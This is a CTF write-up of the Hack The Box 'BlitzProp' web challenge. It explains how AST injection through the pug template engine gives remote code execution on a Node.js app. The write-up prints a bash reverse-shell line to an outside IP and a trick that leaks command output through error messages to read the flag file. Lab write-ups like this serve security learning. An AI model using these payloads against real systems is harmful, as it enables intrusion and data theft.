<link type="text/css" rel="stylesheet" href="stylesheets/main.css" />
<meta name="viewport" content="width=device-width, initial-scale=.5, maximum-scale=12.0, minimum-scale=.25, user-scalable=yes"/>
# Hack The Box - Cyber Apocalypse 2021 - BlitzProp Writeup

From 19th April 2021 - 23rd April 2021 [Hack The Box](https://www.hackthebox.eu/) ran their "Cyber Apocalypse" CTF. 

The event was a lot of fun! It ran from Monday - Friday but I managed to get a few hours in each night after work.

I thought I'd do a little write up for one of the challanges, BlitzProp, as the solution I stumbled upon seemed interesting. I'm not sure if this is the intended way to solve the challenge, at the time of writing this the CTF is still ongoing, so I am looking forward to reading writeups from others who solve this challenge.

## Challenge Overview

This challenge was titled BlitzProp.

Like all other challenges in the Web category, we are provided with a dockerized target which can be spun up on demand. For this challenge, we are also given some source code to download.

## Analysis & Solution

To begin with I opened the website just to get a visual idea of what I've got to work with:

<img src="{{site.url}}/resources/images/BlitzProp/IndexPage.png" style="display: block; margin: auto;" class="img-responsive"/>

The page is pretty basic. There is one area to input text along with a "Submit" button.

There are four song titles we can enter. Entering one of these causes the text at the bottom to show `Hello guest, thank you for letting us know!`

<img src="{{site.url}}/resources/images/BlitzProp/IndexPageValidInput.png" style="display: block; margin: auto;" />

Inputting invalid text results in the text at the bottom showing `Please provide us with the name of an existing song`

<img src="{{site.url}}/resources/images/BlitzProp/PageInvalidInput.png" style="display: block; margin: auto;" />

Ok, so at this point it's time to take a look at the source code. My first step is usually to `tree` the source folder to get an overview of what we have to work with:

<img src="{{site.url}}/resources/images/BlitzProp/SourceFiles.png" style="display: block; margin: auto;" />

Lets look at the `entrypoint.sh` file to try to gather some information about how the docker instance is created:

<img src="{{site.url}}/resources/images/BlitzProp/entrypoint.png" style="display: block; margin: auto;" />

From this we can see that the flag for this challenge lives under `/app/flag` with some random alphanumeric characters at the end. Good to know.

Next, lets look at the `Dockerfile`. This reveals that the site is running a node-js application.

<img src="{{site.url}}/resources/images/BlitzProp/Dockerfile.png" style="display: block; margin: auto;" />

Next, lets look at the `index.js` file

<img src="{{site.url}}/resources/images/BlitzProp/IndexSource.png" style="display: block; margin: auto;" />

From this we can gather that when the submit button is pressed, a `POST` call is made to the `/api/submit` endpoint. 

The function for this endpoint checks if the song we passed in the request body matches one of the expected song names. A different response is generated dependant on whether or not the request we pass includes one of the expected song names.

At this point a few things stand out:
- The song names are being compared against the request body using an `includes` call. This means we have some freedom in what we pass to the endpoint, so long as we include one of the song names somewhere in the request.
- There are only two possible responses. The only variable part is in the successful response, which has the `#{user}` variable.
- The response is generated via a `pug.compile` call

So at this point, my thoughts were, "How do I inject a value for the `user` variable here? Can I inject a command such as `ls /app/flag*` and get the application to execute the command and return the output to me as part of the response? What does `pug.compile` do?"

So I started doing some research on Google. I am still a beginner when it comes to Web Application exploitation, but I've been gradually learning thanks to Hack The Box.

While looking into the `pug` module I stumbled across a very interesting article on gaining Remote Code Execution (RCE) using Abstract Syntax Tree (AST) injection: https://blog.p6.is/AST-Injection/

What really stood out was the section on the `pug` module: https://blog.p6.is/AST-Injection/#Pug

The author provides a python script which sends a `POST` request to a vulnerable endpoint. This request causes the vulnerable endpoint to execute some code, providing us with a shell.

I wasn't 100% sure if this exploit would work against the endpoint, but it only takes a minute to try it out so I figured it was worth a shot! 

So, after running the script against the endpoint, I entered a valid song and pressed 'Submit'. This time, I get a status 500 Response
<img src="{{site.url}}/resources/images/BlitzProp/Status_500.png" style="display: block; margin: auto;" />

But what's really interesting is what we get back as the response!

<img src="{{site.url}}/resources/images/BlitzProp/Status_500_response.png" style="display: block; margin: auto;" />

```
Error: Command failed: bash -c 'bash -i >& /dev/tcp/10.10.14.205/3333 0>&1'
/bin/sh: bash: not found
 on line 1
    at checkExecSyncError (node:child_process:707:11)
    at Object.execSync (node:child_process:744:15)
    at eval (eval at wrap (/app/node_modules/pug-runtime/wrap.js:6:10), <anonymous>:13:63)
    at template (eval at wrap (/app/node_modules/pug-runtime/wrap.js:6:10), <anonymous>:17:7)
    at /app/routes/index.js:16:81
    at Layer.handle [as handle_request] (/app/node_modules/express/lib/router/layer.js:95:5)
    at next (/app/node_modules/express/lib/router/route.js:137:13)
    at Route.dispatch (/app/node_modules/express/lib/router/route.js:112:3)
    at Layer.handle [as handle_request] (/app/node_modules/express/lib/router/layer.js:95:5)
    at /app/node_modules/express/lib/router/index.js:281:22
```

So at this point I know that I've got RCE on this target! Now, what happens if I change the script so that `execSync` runs `ls /app/flag*`?

<img src="{{site.url}}/resources/images/BlitzProp/ls-command-ndefine-response.png" style="display: block; margin: auto;" />

We get back a 200 response with `Hello guestndefine, thank you for letting us know!`

Ok so it looks a little messed up, but we're not getting the output from the `ls /app/flag*` command in the response unfortunately.

So at this point I took some time to think, there's really only two things to consider now:
1. We are able to perform RCE on the target
2. We can only get output if the command fails

After some thought I realised that, while we are restricted by the fact that we can only get output if the command fails, there is a way we can work around this. We need to do two things to achieve this:
1. Redirect our command's output to STDERR
2. Force the bash command to return a non zero exit code, so that the caller thinks the command failed

This can be done really easily in bash. If we modify the command so that it is `ls /app/flag* 1>&2 && exit 1` then we can redirect the output of `ls /app/flag*` to STDERR (achieved by the `1>&2` part) and have the command return an exit code of 1 (achieved by the `exit 1` part). This should now mean that the `execSync` call will interpret the command as failing, and the `checkExecSyncError` error handling should return the STDERR output to us!

<img src="{{site.url}}/resources/images/BlitzProp/ls-command-output-response.png" style="display: block; margin: auto;" />

Perfect! While going back through this challenge for this write-up, I used `ls /app*` instead of `ls /app/flag*` by mistake, so here is the truncated output:
```
Error: Command failed: ls /app/* 1>&2 && exit 1
/app/flagz8aiD
... truncated
css
images
js

/app/views:
index.html
 on line 1
    at checkExecSyncError (node:child_process:707:11)
    at Object.execSync (node:child_process:744:15)
    at eval (eval at wrap (/app/node_modules/pug-runtime/wrap.js:6:10), <anonymous>:13:63)
    at template (eval at wrap (/app/node_modules/pug-runtime/wrap.js:6:10), <anonymous>:17:7)
    at /app/routes/index.js:16:81
    at Layer.handle [as handle_request] (/app/node_modules/express/lib/router/layer.js:95:5)
    at next (/app/node_modules/express/lib/router/route.js:137:13)
    at Route.dispatch (/app/node_modules/express/lib/router/route.js:112:3)
    at Layer.handle [as handle_request] (/app/node_modules/express/lib/router/layer.js:95:5)
    at /app/node_modules/express/lib/router/index.js:281:22
```

Well, now we have the file for the flag: `/app/flagz8aiD` . All we have to do is get its contents! We can do that easily using `cat /app/flagz8aiD 1>&2 && exit 1`

<img src="{{site.url}}/resources/images/BlitzProp/cat-with-flag-output.png" style="display: block; margin: auto;" />

And there we have it, the flag is `CHTB{p0llute_with_styl3}`

```
Error: Command failed: cat /app/flagz8aiD 1>&2 && exit 1
CHTB{p0llute_with_styl3} on line 1
    at checkExecSyncError (node:child_process:707:11)
    at Object.execSync (node:child_process:744:15)
    at eval (eval at wrap (/app/node_modules/pug-runtime/wrap.js:6:10), <anonymous>:13:63)
    at template (eval at wrap (/app/node_modules/pug-runtime/wrap.js:6:10), <anonymous>:17:7)
    at /app/routes/index.js:16:81
    at Layer.handle [as handle_request] (/app/node_modules/express/lib/router/layer.js:95:5)
    at next (/app/node_modules/express/lib/router/route.js:137:13)
    at Route.dispatch (/app/node_modules/express/lib/router/route.js:112:3)
    at Layer.handle [as handle_request] (/app/node_modules/express/lib/router/layer.js:95:5)
    at /app/node_modules/express/lib/router/index.js:281:22
```

This was a really fun challenge. The folks at Hack The Box have done a fantastic job with the CTF, I'm looking forward to doing more in the future!
